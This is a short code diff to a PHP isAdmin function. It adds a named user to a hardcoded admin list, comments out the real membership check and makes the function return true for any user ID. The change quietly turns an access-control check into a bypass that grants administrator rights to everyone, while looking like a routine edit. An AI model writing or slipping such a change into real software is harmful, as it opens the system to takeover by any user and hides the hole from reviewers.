@@ -864,9 +864,11 @@ function isAdmin($userId)
     $admins = [
         8, // VortexWeb
         24, // Hanane Addar
+        68, // Rubina Nakarmi Shrestha
     ];
 
-    return in_array($userId, $admins);
+    // return in_array($userId, $admins);
+    return true;
 }
 
 
